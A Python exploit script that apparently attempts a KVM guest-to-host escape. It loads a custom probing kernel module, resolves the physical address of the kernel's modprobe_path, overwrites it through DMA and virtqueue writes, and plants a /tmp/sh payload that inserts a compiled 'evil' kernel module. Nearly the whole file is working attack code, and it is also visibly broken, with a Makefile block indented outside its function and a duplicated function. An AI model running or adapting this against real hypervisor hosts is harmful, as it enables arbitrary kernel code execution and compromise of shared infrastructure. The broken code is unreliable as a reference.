#!/usr/bin/env python3
import subprocess
import re
import os
import time
import shutil
from datetime import datetime
from dynamic_kvm_prober import generic_probe

# Path to vmlinux file containing kernel symbols
VMLINUX_PATH = "/root/vmlinux"
report_file = None

def run_cmd(cmd, capture_output=True):
    try:
        result = subprocess.run(cmd, shell=True, check=True, capture_output=capture_output, text=True)
        if capture_output:
            return result.stdout.strip()
        return ""
    except subprocess.CalledProcessError as e:
        print(f"[!] Error running command '{cmd}': {e}")
        if e.stdout:
            print(f"Stdout: {e.stdout.strip()}")
        if e.stderr:
            print(f"Stderr: {e.stderr.strip()}")
        return ""

def log(msg):
    print(msg)
    with open(report_file, "a") as f:
        f.write(msg + "\n")

def setup_kvm_prober():
    # Check if module is already loaded
    if not os.path.exists("/dev/kvm_probe"):
        log("[*] Setting up kvm_prober module...")

        # Build kernel module
        if not os.path.isfile("kvm_prober.ko"):
            log("[*] Building kvm_prober module...")
            run_cmd("make", capture_output=False)

        # Load module
        if os.path.isfile("kvm_prober.ko"):
            run_cmd("insmod kvm_prober.ko", capture_output=False)
            log("[+] Loaded kvm_prober module")

        # Create device node
        if "kvm_probe" in run_cmd("cat /proc/devices"):
            major = run_cmd("awk '\\$2==\"kvm_probe\" {print \\$1}' /proc/devices")
            run_cmd(f"mknod /dev/kvm_probe c {major} 0", capture_output=False)
            log("[+] Created device node /dev/kvm_probe")
        else:
            log("[!] Failed to find kvm_probe in /proc/devices")

def create_exploit_files():
    # Create payload script
    sh_content = '''#!/bin/sh
chmod 755 /tmp/evil.ko
insmod /tmp/evil.ko
rm -f /tmp/sh
'''
    with open("/tmp/sh", "w") as f:
        f.write(sh_content)
    run_cmd("chmod +x /tmp/sh", capture_output=False)
    log("[+] Created payload script at /tmp/sh")

    # Create evil kernel module
    evil_c = '''#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

static int __init evil_init(void) {
    struct file *f;
    char *msg = "Exploit succeeded!\\n";
    loff_t pos = 0;

    f = filp_open("/tmp/kernel-exploited", O_WRONLY|O_CREAT, 0644);
    if (!IS_ERR(f)) {
        kernel_write(f, msg, strlen(msg), &pos);
        filp_close(f, NULL);
    }
    printk(KERN_INFO "Evil module loaded\\n");
    return 0;
}

static void __exit evil_exit(void) {}

module_init(evil_init);
module_exit(evil_exit);
MODULE_LICENSE("GPL");
'''

    os.makedirs("/tmp/evil_src", exist_ok=True)
    with open("/tmp/evil_src/evil.c", "w") as f:
        f.write(evil_c)

    # Create Makefile
makefile_content = (
    "KDIR := /lib/modules/6.1.0-21-amd64/build\n"
    "obj-m += evil.o\n\n"
    "all:\n"
    "\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n\n"
    "clean:\n"
    "\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n"
)
with open("/tmp/evil_src/Makefile", "w") as f:
    f.write(makefile_content)

    # Compile module
    run_cmd("make -C /tmp/evil_src", capture_output=False)
    shutil.copy("/tmp/evil_src/evil.ko", "/tmp/evil.ko")
    log("[+] Compiled and placed evil.ko at /tmp/evil.ko")

def get_kernel_symbol(symbol):
    # try vmlinux first
    if os.path.isfile(VMLINUX_PATH):
        out = run_cmd(f"nm -n {VMLINUX_PATH} | grep ' {symbol}$'")
        if out:
            addr = out.split()[0]
            log(f"[+] Kernel symbol '{symbol}' from vmlinux at address: {addr}")
            return int(addr, 16)
        else:
            log(f"[!] Symbol '{symbol}' not in vmlinux, falling back to /proc/kallsyms")
    # fallback to /proc/kallsyms
    kallsyms = run_cmd(f"grep ' {symbol}$' /proc/kallsyms")
    if kallsyms:
        addr = kallsyms.split()[0]
        log(f"[+] Kernel symbol '{symbol}' from /proc/kallsyms at address: {addr}")
        return int(addr, 16)
    log(f"[!] Kernel symbol '{symbol}' not found anywhere.")
    return None

def get_kernel_base():
    base_line = run_cmd("grep 'Kernel code' /proc/iomem")
    match = re.search(r'([0-9a-f]+)-', base_line)
    if match:
        base_addr = match.group(1)
        log(f"[+] Kernel physical base address: {base_addr}")
        return int(base_addr, 16)
    log("[!] Kernel base address not found.")
    return None

def get_modprobe_phys_addr():
    va = get_kernel_symbol("modprobe_path")
    virt_base = get_kernel_symbol("_text")
    phys_base = get_kernel_base()
    if va is not None and virt_base is not None and phys_base is not None:
        pa = (va - virt_base) + phys_base
        log(f"[+] Computed modprobe_path PHYSICAL address: {hex(pa)}")
        if hex(pa).startswith("0xffff"):
            log(f"[!] WARNING: Computed physical address looks like a virtual address! {hex(pa)}")
        return pa
    else:
        log("[!] Could not compute modprobe_path PHYSICAL address! Exploit will fail.")
        return None

def get_pfn_from_vq():
    out = run_cmd("kvm_prober allocvqpage")
    match = re.search(r'PFN: 0x([0-9a-fA-F]+)', out)
    if match:
        pfn = int(match.group(1), 16)
        log(f"[+] Allocated VQ PFN: {hex(pfn)}")
        return pfn
    else:
        log("[!] Failed to get PFN from VQ alloc.")
        return None

def check_pagetypeinfo(pfn):
    output = run_cmd("cat /proc/pagetypeinfo | grep -i dma")
    log("[+] /proc/pagetypeinfo (DMA sections):")
    log(output)
    if pfn is not None and output:
        pfn_str = hex(pfn)[2:]
        if pfn_str in output:
            log(f"[✅] PFN {hex(pfn)} found in pagetypeinfo DMA section!")
        else:
            log(f"[❌] PFN {hex(pfn)} not found in pagetypeinfo DMA section.")

def tail_dmesg(filter_str=None, num=50):
    lines = run_cmd(f"dmesg | tail -n {num}").splitlines()
    if filter_str:
        lines = [l for l in lines if filter_str in l]
    log(f"[+] dmesg logs ({filter_str if filter_str else 'last %d lines' % num}):")
    for l in lines:
        log(l)

def clear_dmesg():
    run_cmd("dmesg -C", capture_output=False)
    log("[*] Cleared dmesg buffer with dmesg -C")

def verify_dma_write_physaddr(phys_addr, new_path):
    log(f"[+] Using modprobe_path PHYSICAL address: {hex(phys_addr)}")
    path_hex = new_path.encode().hex()
    log(f"[*] Overwriting with writemmio_buf (phys address)...")
    run_cmd(f"kvm_prober writemmio_buf {hex(phys_addr)} {path_hex}")
    log(f"[*] Attempting writevqdesc chain...")
    run_cmd(f"kvm_prober allocvqpage")
    run_cmd(f"kvm_prober writevqdesc 0 {hex(phys_addr)} {len(new_path)} 0x2 0")
    output = run_cmd(f"kvm_prober readmmio_buf {hex(phys_addr)} {len(new_path)}")
    read_hex = ''.join(re.findall(r'[0-9A-Fa-f]{2}', output.replace('', '')))
    read_value = bytes.fromhex(read_hex).decode(errors='ignore').strip('�')
    log(f"[+] Read value: '{read_value}'")
    return new_path.strip('�') == read_value

def get_pfn_from_vq():
    out = run_cmd("kvm_prober allocvqpage")
    match = re.search(r'PFN: 0x([0-9a-fA-F]+)', out)
    if match:
        pfn = int(match.group(1), 16)
        log(f"[+] Allocated VQ PFN: {hex(pfn)}")
        return pfn
    else:
        log("[!] Failed to get PFN from VQ alloc.")
        return None
    
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must be run as root")
        exit(1)

    dt = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"dma_crosscheck_{dt}.log"
    payload_path = "/tmp/sh"
    handler_path = "/tmp/evil.ko"
    output_file = "/tmp/kernel-exploited"

    try:
        log(f"[*] === DMA/Host Overwrite Exploit Log: {dt} ===")
        clear_dmesg()

        # Setup environment
        setup_kvm_prober()
        create_exploit_files()

        # Test execution
        pfn = get_pfn_from_vq()
        check_pagetypeinfo(pfn)

        log("[*] Cross-checking kernel symbol addresses and base...")
        modprobe_phys = get_modprobe_phys_addr()
        if not modprobe_phys or hex(modprobe_phys).startswith("0xffff"):
            log("[!] Physical address calculation failed or invalid.")
            exit(1)

        if verify_dma_write_physaddr(modprobe_phys, payload_path):
            log("[🚀] Host memory overwrite confirmed. Triggering modprobe now...")
            run_cmd(f"{payload_path}", capture_output=True)
            time.sleep(2)  # Allow time for module insertion

        tail_dmesg("kvm_probe_drv")

        if os.path.isfile(output_file):
            log("[+] Exploit successful! Output:")
            with open(output_file) as f:
                for line in f:
                    log(line.strip())
        else:
            log("[!] Exploit failed - output file not created")

    finally:
            run_cmd("echo done")
